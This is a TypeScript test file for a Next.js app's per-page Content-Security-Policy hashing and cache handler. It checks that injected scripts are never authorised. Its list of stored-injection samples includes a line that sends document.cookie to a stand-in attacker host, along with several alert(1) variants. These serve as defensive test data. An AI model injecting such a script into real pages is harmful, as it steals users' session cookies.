/**
 * The per-document Content-Security-Policy (spec 004 §14 A2, AC-23 enforcement half, ADR-0016;
 * TASK-058): the hashing rule, the policy composition, the manifest read-back, the stamp on a
 * cache entry, and the cache handler over Next's real `FileSystemCache` on a temporary
 * directory.
 *
 * The browser half — that a real build hydrates under the enforced header and that an inline
 * script injected into the stored HTML is refused — is `tests/e2e/csp-enforced.spec.ts`. This file
 * pins what a browser cannot tell us cheaply: which `<script>` elements are hashed (Next's flight
 * pushes, by exact shape) and which are not (everything else, stored injections included), and
 * that a report-only server sends no enforcing header whatever an entry was written with.
 */
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { nodeFs } from "next/dist/server/lib/node-fs-methods.js";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import CspCacheHandler from "../../src/lib/csp-cache-handler.ts";
import {
  CSP_HEADER,
  CSP_REPORT_ONLY_HEADER,
  cspEnforced,
  flightScriptHashes,
  isFlightScript,
  stampCspHeaders,
  staticPolicyFromRoutesManifest,
  withScriptHashes,
} from "../../src/lib/csp-response.ts";
import { cspValue } from "../../src/lib/csp";
import {
  cspEnforceState,
  resetCspStateForTests,
} from "../../src/lib/csp-state.ts";
import { buildHealthResponse, reportCspEnforce } from "../../src/lib/health";
import { createLogger } from "../../src/lib/logger";
import { cspReportOnly } from "../../src/lib/env.schema";

const sha = (text: string): string =>
  `sha256-${createHash("sha256").update(text, "utf8").digest("base64")}`;

/** The Consent-Mode bootstrap: authorised by the static policy's build-time hash, never per page. */
const BOOTSTRAP = "window.dataLayer=window.dataLayer||[];";
/** The three statement shapes Next 16 writes (`use-flight-response.js`). */
const FLIGHT_INIT = "(self.__next_f=self.__next_f||[]).push([0])";
const FLIGHT_A = 'self.__next_f.push([1,"0:{\\"a\\":1}"])';
const FLIGHT_B = 'self.__next_f.push([1,"1:\\"$Sreact.fragment\\""])';

/** The shape of a Next 16 document: bootstrap, JSON-LD, external chunk, flight blocks. */
const DOCUMENT = [
  "<!DOCTYPE html><html><head>",
  `<script id="fo-consent-mode">${BOOTSTRAP}</script>`,
  '<script type="application/ld+json">{"@context":"https://schema.org"}</script>',
  '<script src="/_next/static/chunks/main.js" async=""></script>',
  "</head><body><main>hi</main>",
  `<script>${FLIGHT_INIT}</script>`,
  `<script>${FLIGHT_A}</script>`,
  `<script>${FLIGHT_B}</script>`,
  "</body></html>",
].join("");

const FLIGHT_HASHES = [sha(FLIGHT_INIT), sha(FLIGHT_A), sha(FLIGHT_B)];

/**
 * Stored injections: scripts that are in the HTML **before** it is cached and hashed (`/review
 * 196` item 1, `/break 196` hole 1). None of them may receive a hash.
 */
const STORED_INJECTIONS = [
  "fetch('https://evil.example/?c='+document.cookie)",
  "window.__foInjected=1",
  // A flight push with trailing code: the greedy capture is not JSON.
  'self.__next_f.push([1,"x"]);alert(1)',
  'self.__next_f.push([1,"x"]+alert(1))',
  "self.__next_f.push([1,alert(1)])",
  // Code before or around a well-formed push.
  'alert(1);self.__next_f.push([1,"x"])',
  'self.__next_f.push([1,"x"])\nalert(1)',
  // The right call on the wrong shape.
  "self.__next_f.push([1,2])",
  'self.__next_f.push([2,"x"])',
  "self.__next_f.push({})",
  "(self.__next_f=self.__next_f||[]).push([1])",
  "(self.__next_f=self.__next_f||[]).push([0]);alert(1)",
  'self.__next_f.push(["1","x"])',
  // The consent script's id on other bytes: only the static hash of the real bytes passes.
  "window.dataLayer=window.dataLayer||[];alert(1)",
];

const STATIC_POLICY = cspValue("production", {
  inlineHashes: [sha(BOOTSTRAP)],
});

describe("flightScriptHashes", () => {
  it("hashes the flight pushes Next writes, in document order, over their exact bytes", () => {
    expect(flightScriptHashes(DOCUMENT)).toEqual(FLIGHT_HASHES);
  });

  it("does not hash the consent bootstrap: the static build-time hash is its only authority", () => {
    expect(flightScriptHashes(DOCUMENT)).not.toContain(sha(BOOTSTRAP));
  });

  it("gives a stored injection no hash, whatever it looks like", () => {
    for (const injected of STORED_INJECTIONS) {
      const html = DOCUMENT.replace(
        "</body>",
        `<script>${injected}</script></body>`,
      );
      expect(isFlightScript(injected), injected).toBe(false);
      expect(flightScriptHashes(html), injected).toEqual(FLIGHT_HASHES);
      expect(
        stampedPolicy(html).includes(sha(injected)),
        `injected script authorised: ${injected}`,
      ).toBe(false);
    }
  });

  // `/break 196` round 2 hole 1: the exact array shape is pinned, not just "some JSON".
  it("refuses a wrong arity, a wrong element type and a non-array argument", () => {
    const refused = [
      // Wrong arity.
      'self.__next_f.push([1,"x","y"])',
      "self.__next_f.push([1])",
      "self.__next_f.push([])",
      "(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2])",
      '(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,{},"x"])',
      // Wrong element type.
      "self.__next_f.push([1,null])",
      "self.__next_f.push([3,7])",
      'self.__next_f.push([0,"x"])',
      'self.__next_f.push([4,"x"])',
      "(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([5,1])",
      '(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push(["2",null])',
      // Not an array.
      'self.__next_f.push("x")',
      "self.__next_f.push(1)",
      '(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push({"0":2})',
    ];
    for (const body of refused) {
      expect(isFlightScript(body), body).toBe(false);
      expect(flightScriptHashes(`<script>${body}</script>`), body).toEqual([]);
    }
  });

  it("accepts the other shapes Next emits: binary chunks and the form-state bootstrap", () => {
    expect(isFlightScript('self.__next_f.push([3,"AAEC"])')).toBe(true);
    expect(isFlightScript('self.__next_f.push([1,""])')).toBe(true);
    expect(
      isFlightScript(
        '(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,{"a":[1]}])',
      ),
    ).toBe(true);
    // Next's HTML escaping of `<` inside the JSON string still parses.
    expect(
      isFlightScript('self.__next_f.push([1,"\\u003c/script\\u003e"])'),
    ).toBe(true);
  });

  it("skips external scripts and JSON-LD, which `script-src` hashes do not govern", () => {
    expect(
      flightScriptHashes(
        `<script src="/a.js">${FLIGHT_A}</script><script type="application/ld+json">${FLIGHT_A}</script>` +
          `<script type='text/plain'>${FLIGHT_A}</script>`,
      ),
    ).toEqual([]);
  });

  it("hashes the executable types, case-insensitively", () => {
    expect(
      flightScriptHashes(
        `<SCRIPT type="module">${FLIGHT_A}</SCRIPT><script type=text/javascript>${FLIGHT_B}</script >`,
      ),
    ).toEqual([sha(FLIGHT_A), sha(FLIGHT_B)]);
  });

  it("does not trim: surrounding whitespace is not a flight statement", () => {
    expect(flightScriptHashes(`<script> ${FLIGHT_A} </script>`)).toEqual([]);
  });

  it("hashes CR LF as LF, as the HTML parser hands the text to the browser (nit 3)", () => {
    const withCrLf = 'self.__next_f.push([1,"a\r\nb"])';
    // A raw CR LF inside a JSON string is not valid JSON, so the push is refused rather than
    // hashed under the wrong bytes; the normalised form is what a browser would see.
    expect(flightScriptHashes(`<script>${withCrLf}</script>`)).toEqual([]);
    // CR LF as JSON whitespace between elements is valid either way; the hash is of the LF form.
    const pushCrLf = FLIGHT_A.replace("[1,", "[1,\r\n");
    expect(flightScriptHashes(`<script>${pushCrLf}</script>`)).toEqual([
      sha(pushCrLf.replace("\r\n", "\n")),
    ]);
    expect(flightScriptHashes(`<script>${pushCrLf}</script>`)).not.toEqual([
      sha(pushCrLf),
    ]);
  });

  it("lists a repeated push once", () => {
    expect(
      flightScriptHashes(
        `<script>${FLIGHT_A}</script><p></p><script>${FLIGHT_A}</script>`,
      ),
    ).toEqual([sha(FLIGHT_A)]);
  });

  it("hashes multi-byte text as UTF-8, as the browser does", () => {
    const text = 'self.__next_f.push([1,"Łódź – Köln"])';
    expect(flightScriptHashes(`<script>${text}</script>`)).toEqual([
      `sha256-${createHash("sha256").update(Buffer.from(text, "utf8")).digest("base64")}`,
    ]);
  });
});

/** The enforcing policy the stamp would put on a page with this HTML. */
function stampedPolicy(html: string): string {
  const value = {
    kind: "APP_PAGE",
    html,
    headers: {} as Record<string, string>,
  };
  stampCspHeaders(value, { staticPolicy: STATIC_POLICY, enforce: true });
  return value.headers[CSP_HEADER] ?? "";
}

describe("withScriptHashes", () => {
  it("appends quoted hashes to `script-src` and leaves every other directive alone", () => {
    const policy = withScriptHashes(STATIC_POLICY, [sha(FLIGHT_A)]);
    expect(policy).toBe(
      STATIC_POLICY.replace(
        `script-src 'self' '${sha(BOOTSTRAP)}'`,
        `script-src 'self' '${sha(BOOTSTRAP)}' '${sha(FLIGHT_A)}'`,
      ),
    );
  });

  it("does not repeat a hash the static policy already names", () => {
    const policy = withScriptHashes(STATIC_POLICY, [sha(BOOTSTRAP)]) ?? "";
    expect(policy.split(sha(BOOTSTRAP))).toHaveLength(2);
  });

  it("never adds 'unsafe-inline' or 'unsafe-eval'", () => {
    const policy =
      withScriptHashes(STATIC_POLICY, flightScriptHashes(DOCUMENT)) ?? "";
    expect(policy).not.toContain("'unsafe-eval'");
    const scriptSrc = policy
      .split(";")
      .find((part) => part.trim().startsWith("script-src"));
    expect(scriptSrc).not.toContain("'unsafe-inline'");
  });

  it("refuses to guess when there is no `script-src` to extend", () => {
    expect(withScriptHashes("default-src 'self';", [sha("x")])).toBeUndefined();
  });
});

describe("staticPolicyFromRoutesManifest", () => {
  it("reads the Report-Only value next.config.ts compiled into the manifest", () => {
    expect(
      staticPolicyFromRoutesManifest({
        headers: [
          {
            source: "/media/:p*",
            headers: [{ key: "Cache-Control", value: "x" }],
          },
          {
            source: "/:path*",
            headers: [
              { key: "X-Frame-Options", value: "DENY" },
              { key: CSP_REPORT_ONLY_HEADER, value: STATIC_POLICY },
            ],
          },
        ],
      }),
    ).toBe(STATIC_POLICY);
  });

  it("is undefined for a manifest without one, or not a manifest at all", () => {
    expect(staticPolicyFromRoutesManifest({ headers: [] })).toBeUndefined();
    expect(staticPolicyFromRoutesManifest({})).toBeUndefined();
    expect(staticPolicyFromRoutesManifest(null)).toBeUndefined();
    expect(staticPolicyFromRoutesManifest("x")).toBeUndefined();
  });
});

describe("cspEnforced", () => {
  it("enforces on the exact string `false` only, the mirror of cspReportOnly()", () => {
    for (const value of [undefined, "", "true", "False", "0", "no"]) {
      const source = value === undefined ? {} : { CSP_REPORT_ONLY: value };
      expect(cspEnforced(source), String(value)).toBe(false);
      expect(cspReportOnly(source), String(value)).toBe(true);
    }
    expect(cspEnforced({ CSP_REPORT_ONLY: "false" })).toBe(true);
    expect(cspReportOnly({ CSP_REPORT_ONLY: "false" })).toBe(false);
  });
});

describe("stampCspHeaders", () => {
  const page = (headers: Record<string, string> = {}) => ({
    kind: "APP_PAGE",
    html: DOCUMENT,
    headers,
  });

  it("enforcing: the static policy plus this document's hashes, other headers kept", () => {
    const value = page({ "x-next-cache-tags": "_N_T_/en" });
    expect(
      stampCspHeaders(value, { staticPolicy: STATIC_POLICY, enforce: true }),
    ).toBe("enforced");
    expect(value.headers).toEqual({
      "x-next-cache-tags": "_N_T_/en",
      [CSP_HEADER]: withScriptHashes(STATIC_POLICY, FLIGHT_HASHES),
    });
  });

  it("report-only: no CSP on the entry, and a stale one from an earlier write is removed", () => {
    const value = page({
      "content-security-policy": "stale",
      [CSP_REPORT_ONLY_HEADER]: "stale",
      "x-keep": "1",
    });
    expect(
      stampCspHeaders(value, { staticPolicy: STATIC_POLICY, enforce: false }),
    ).toBe("report-only");
    expect(value.headers).toEqual({ "x-keep": "1" });
  });

  it("fails open when the static policy is unknown: no enforcing header, nothing thrown", () => {
    const value = page();
    expect(
      stampCspHeaders(value, { staticPolicy: undefined, enforce: true }),
    ).toBe("failed-open");
    expect(value.headers).toEqual({});
  });

  it("leaves everything that is not a cached HTML page untouched", () => {
    const route = { kind: "APP_ROUTE", body: Buffer.from("{}"), headers: {} };
    const fetch = { kind: "FETCH", data: {} };
    const streaming = { kind: "APP_PAGE", html: { pipe: true }, headers: {} };
    for (const value of [route, fetch, streaming]) {
      const before = JSON.stringify(value);
      expect(
        stampCspHeaders(value, { staticPolicy: STATIC_POLICY, enforce: true }),
      ).toBe("skipped");
      expect(JSON.stringify(value)).toBe(before);
    }
    expect(
      stampCspHeaders(null, { staticPolicy: STATIC_POLICY, enforce: true }),
    ).toBe("skipped");
  });
});

describe("CspCacheHandler over Next's FileSystemCache", () => {
  let dist = "";
  const previous = process.env["CSP_REPORT_ONLY"];

  beforeEach(() => {
    resetCspStateForTests();
    dist = mkdtempSync(join(tmpdir(), "fo-csp-"));
    mkdirSync(join(dist, "server", "app"), { recursive: true });
    writeFileSync(
      join(dist, "routes-manifest.json"),
      JSON.stringify({
        headers: [
          {
            source: "/:path*",
            headers: [{ key: CSP_REPORT_ONLY_HEADER, value: STATIC_POLICY }],
          },
        ],
      }),
    );
  });

  afterEach(() => {
    rmSync(dist, { recursive: true, force: true });
    if (previous === undefined) delete process.env["CSP_REPORT_ONLY"];
    else process.env["CSP_REPORT_ONLY"] = previous;
  });

  const handler = (reportOnly: string | undefined) => {
    if (reportOnly === undefined) delete process.env["CSP_REPORT_ONLY"];
    else process.env["CSP_REPORT_ONLY"] = reportOnly;
    return new CspCacheHandler({
      fs: nodeFs,
      serverDistDir: join(dist, "server"),
      flushToDisk: true,
      dev: false,
    });
  };

  const expected = withScriptHashes(STATIC_POLICY, FLIGHT_HASHES);

  /** The entry value as the tests read it; the handler's contract types it as `unknown`. */
  const valueOf = (data: { value: unknown } | null) =>
    data?.value as { html?: unknown; headers?: unknown } | undefined;

  it("serves a build-time entry with the enforcing header when the server enforces", async () => {
    // What `next build` leaves: html, rsc and a meta without any CSP.
    writeFileSync(join(dist, "server", "app", "en.html"), DOCUMENT);
    writeFileSync(join(dist, "server", "app", "en.rsc"), "0:{}");
    writeFileSync(
      join(dist, "server", "app", "en.meta"),
      JSON.stringify({ headers: { "x-nextjs-prerender": "1" }, status: 200 }),
    );

    const data = await handler("false").get("/en", {
      kind: "APP_PAGE",
      isRoutePPREnabled: false,
      isFallback: false,
    });
    expect(valueOf(data)?.headers).toEqual({
      "x-nextjs-prerender": "1",
      [CSP_HEADER]: expected,
    });
  });

  it("stamps an entry on `set` — the object the first response is sent from — and on disk", async () => {
    const value = {
      kind: "APP_PAGE",
      html: DOCUMENT,
      rscData: Buffer.from("0:{}"),
      headers: {},
      status: 200,
    };
    await handler("false").set("/de", value, {
      cacheControl: { revalidate: 3600, expire: undefined },
      isRoutePPREnabled: false,
      isFallback: false,
    });
    expect(value.headers).toEqual({ [CSP_HEADER]: expected });
    const meta = JSON.parse(
      readFileSync(join(dist, "server", "app", "de.meta"), "utf8"),
    ) as { headers: Record<string, string> };
    expect(meta.headers[CSP_HEADER]).toBe(expected);
  });

  it("serves no enforcing header from a report-only server, even for an entry written enforcing", async () => {
    const value = {
      kind: "APP_PAGE",
      html: DOCUMENT,
      rscData: Buffer.from("0:{}"),
      headers: {},
      status: 200,
    };
    await handler("false").set("/pl", value, {
      cacheControl: { revalidate: 3600, expire: undefined },
      isRoutePPREnabled: false,
      isFallback: false,
    });
    for (const flag of [undefined, "true"]) {
      const data = await handler(flag).get("/pl", {
        kind: "APP_PAGE",
        isRoutePPREnabled: false,
        isFallback: false,
      });
      expect(valueOf(data)?.headers, String(flag)).toEqual({});
    }
  });

  it("fails open without a routes manifest: the page is served, unenforced", async () => {
    rmSync(join(dist, "routes-manifest.json"));
    writeFileSync(join(dist, "server", "app", "x.html"), DOCUMENT);
    writeFileSync(join(dist, "server", "app", "x.rsc"), "0:{}");
    writeFileSync(
      join(dist, "server", "app", "x.meta"),
      JSON.stringify({ headers: {}, status: 200 }),
    );
    const data = await handler("false").get("/x", {
      kind: "APP_PAGE",
      isRoutePPREnabled: false,
      isFallback: false,
    });
    expect(valueOf(data)?.html).toBe(DOCUMENT);
    expect(valueOf(data)?.headers).toEqual({});
  });

  // `/review 196` item 4: failing open is allowed, failing open silently is not.
  it("a forced handler failure shows `degraded` in /api/health, with one warn line", async () => {
    rmSync(join(dist, "routes-manifest.json"));
    writeFileSync(join(dist, "server", "app", "x.html"), DOCUMENT);
    writeFileSync(join(dist, "server", "app", "x.rsc"), "0:{}");
    writeFileSync(
      join(dist, "server", "app", "x.meta"),
      JSON.stringify({ headers: {}, status: 200 }),
    );
    await handler("false").get("/x", {
      kind: "APP_PAGE",
      isRoutePPREnabled: false,
      isFallback: false,
    });
    // Even with a readable manifest elsewhere, a page that went out unenforced keeps it degraded.
    writeFileSync(
      join(dist, "routes-manifest.json"),
      JSON.stringify({
        headers: [
          {
            source: "/:path*",
            headers: [{ key: CSP_REPORT_ONLY_HEADER, value: STATIC_POLICY }],
          },
        ],
      }),
    );
    const state = cspEnforceState({ CSP_REPORT_ONLY: "false" });
    expect(state).toBe("degraded");

    const lines: string[] = [];
    const log = createLogger({
      level: "debug",
      pretty: false,
      write: (line: string) => lines.push(line),
    });
    const body = buildHealthResponse({
      environment: "production",
      version: "abc",
      fx: { fxAsOf: "2026-10-02", fxSource: "ecb-build" },
      cspEnforce: reportCspEnforce(state, log),
    });
    expect(body.cspEnforce).toBe("degraded");
    expect(lines).toHaveLength(1);
    expect(JSON.parse(lines[0] ?? "{}")).toMatchObject({
      level: "warn",
      msg: "csp enforcement degraded",
      csp_enforce: "degraded",
    });
  });

  it("reports `ok` while enforcing pages, and `report-only` when not asked to enforce", async () => {
    writeFileSync(join(dist, "server", "app", "en.html"), DOCUMENT);
    writeFileSync(join(dist, "server", "app", "en.rsc"), "0:{}");
    writeFileSync(
      join(dist, "server", "app", "en.meta"),
      JSON.stringify({ headers: {}, status: 200 }),
    );
    await handler("false").get("/en", {
      kind: "APP_PAGE",
      isRoutePPREnabled: false,
      isFallback: false,
    });
    expect(cspEnforceState({ CSP_REPORT_ONLY: "false" })).toBe("ok");
    expect(cspEnforceState({})).toBe("report-only");
    expect(cspEnforceState({ CSP_REPORT_ONLY: "true" })).toBe("report-only");

    const lines: string[] = [];
    const log = createLogger({
      level: "debug",
      pretty: false,
      write: (line: string) => lines.push(line),
    });
    expect(reportCspEnforce("ok", log)).toBe("ok");
    expect(reportCspEnforce("report-only", log)).toBe("report-only");
    expect(lines).toEqual([]);
  });

  it("reports `degraded` when enforcing and no handler has stamped yet but the manifest is unreadable", () => {
    expect(
      cspEnforceState(
        { CSP_REPORT_ONLY: "false" },
        join(dist, "nowhere", "server"),
      ),
    ).toBe("degraded");
    expect(
      cspEnforceState({ CSP_REPORT_ONLY: "false" }, join(dist, "server")),
    ).toBe("ok");
  });
});
